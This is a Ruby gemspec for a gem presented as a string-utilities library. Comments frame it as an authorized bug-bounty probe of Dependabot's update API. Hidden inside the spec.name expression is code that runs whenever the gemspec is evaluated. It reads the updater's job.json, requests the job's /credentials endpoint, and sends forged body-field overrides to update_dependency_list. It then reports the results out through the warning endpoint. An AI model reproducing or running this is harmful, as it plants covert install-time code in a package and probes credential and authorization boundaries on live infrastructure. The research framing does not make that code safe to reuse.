# frozen_string_literal: true
#
# v1.1 boundary-verification probe — credentials-endpoint auth-gate test
# + update_dependency_list body-field override audit.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub
# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
# probes within program-published scope; all artifacts sanitized; no third-
# party data accessed; PROBE-MARK encoded outputs only; own-tenant only.
#
# Scope: HYP-NEW-BODYIDOR v1.1 — two distinct sub-audits in one probe.
#
# v1.0 outcome: all 7 body-field overrides on update_pull_request
# returned 400 (likely pre-override-processing schema-validation rejection
# from incomplete body). Less-informative outcome. v1.1 designed for
# higher signal.
#
# Sub-audit A: credentials-endpoint auth-gate
# -------------------------------------------
# api-client.ts:121-170 says GET /credentials uses a SEPARATE token
# (credentialsToken, env GITHUB_DEPENDABOT_CRED_TOKEN), distinct from
# JOB_TOKEN. The proxy only knows JOB_TOKEN (config.go:17). Empirically:
# does the server-side auth-gate on /credentials accept own JOB_TOKEN?
#
# A1: GET /update_jobs/<own>/credentials with attached own JOB_TOKEN
#     - 200 → server-side auth-gate accepts both tokens; READING own
#       credentials via Defect-I-captured token. Major finding.
#     - 401/403 → boundary holds via per-token type check.
#     - 404 → endpoint not exposed at this path.
#
# Sub-audit B: update_dependency_list body-field overrides
# --------------------------------------------------------
# update_dependency_list with single valid dep entry returns 204
# (HYP-F011-A T8 baseline). Use that positive baseline to test
# whether body-supplied override fields shift behavior.
#
# B1: minimal-valid baseline                          → expect 204
# B2: B1 + {"installation-id": 99999999}              → 204 if ignored
# B3: B1 + {"target-repo":"mr-benty/non-existent"}    → 204 if ignored
# B4: B1 + {"job-id": "<own+1>"}                      → 204 if ignored
# B5: B1 + {"organization": "mr-benty"}               → 204 if ignored
# B6: B1 + {"repository-id": 99999999}                → 204 if ignored
#
# If all return 204 → boundary holds; server ignores body overrides for
#   routing; body fields only affect persisted dep-list content.
# If any return non-204 → server processed that override field.
#
# Output via PROBE-MARK encoded sha256+length. Final summary surfaced
# via record_update_job_warning (proxy log channel).

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      results = []
      probe_mark = "PROBE-MARK-HYP-NEW-BODYIDOR-v11"

      own_job_id = nil
      begin
        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
        parsed = JSON.parse(jjson)
        own_job_id = parsed.dig("job", "id") || parsed["id"]
      rescue
      end
      own_job_id ||= ENV["DEPENDABOT_JOB_ID"]

      results << "ownjob-#{own_job_id ? own_job_id.to_s[0, 12] : 'nil'}"

      api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"

      if own_job_id
        # ============================================================
        # Sub-audit A: credentials endpoint auth-gate (single test)
        # ============================================================
        begin
          uri = URI("#{api_url}/update_jobs/#{own_job_id}/credentials")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Get.new(uri.request_uri)
          req["Accept"] = "application/json"
          req["X-Probe-Mark"] = "#{probe_mark}-A1-credentials-gate"
          rsp = h.request(req)
          body_len = rsp.body.to_s.length
          # Only encode sha256-prefix of response, never raw bytes
          body_hash = Digest::SHA256.hexdigest(rsp.body.to_s[0, 1024])[0, 8]
          # If response is 200 with credentials JSON, the body length will be
          # large enough to indicate that — surface as length-bucket only.
          results << "A1-credentials-gate-s#{rsp.code}-l#{body_len}-h#{body_hash}"
        rescue => e
          results << "A1-credentials-gate-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
        end

        # ============================================================
        # Sub-audit B: update_dependency_list body-field overrides
        # ============================================================
        # Minimal valid baseline body for update_dependency_list.
        baseline_data = {
          "dependencies" => [
            {
              "name" => "#{probe_mark}-baseline",
              "version" => "1.0.0",
              "requirements" => []
            }
          ],
          "dependency_files" => []
        }

        variants_b = [
          ["B1-baseline",          {}],
          ["B2-installation-id",   { "installation-id" => 99999999 }],
          ["B3-target-repo",       { "target-repo" => "mr-benty/non-existent-bodyidor-target" }],
          ["B4-body-jobid",        { "job-id" => (own_job_id.to_i + 1).to_s }],
          ["B5-organization",      { "organization" => "mr-benty" }],
          ["B6-repository-id",     { "repository-id" => 99999999 }],
        ]

        variants_b.each_with_index do |(label, override), i|
          begin
            body_data = baseline_data.merge(override)
            body_json = { "data" => body_data }.to_json

            uri = URI("#{api_url}/update_jobs/#{own_job_id}/update_dependency_list")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true
            h.open_timeout = 4
            h.read_timeout = 6
            req = Net::HTTP::Post.new(uri.request_uri)
            req["Content-Type"] = "application/json"
            req["X-Probe-Mark"] = "#{probe_mark}-#{label}"
            req.body = body_json
            rsp = h.request(req)
            body_len = rsp.body.to_s.length
            body_hash = Digest::SHA256.hexdigest(rsp.body.to_s[0, 512])[0, 8]
            results << "B#{i+1}-#{label[0..18]}-s#{rsp.code}-l#{body_len}-h#{body_hash}"
          rescue => e
            results << "B#{i+1}-#{label[0..18]}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
          end
        end

        # Surface summary via record_update_job_warning (proven channel).
        summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]

        begin
          uri = URI("#{api_url}/update_jobs/#{own_job_id}/record_update_job_warning")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Post.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          warn_body = {
            "data" => {
              "warn-type" => "#{probe_mark}-summary",
              "warn-title" => "#{probe_mark}-audit-summary",
              "warn-description" => summary
            }
          }
          req.body = warn_body.to_json
          h.request(req)
        rescue
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
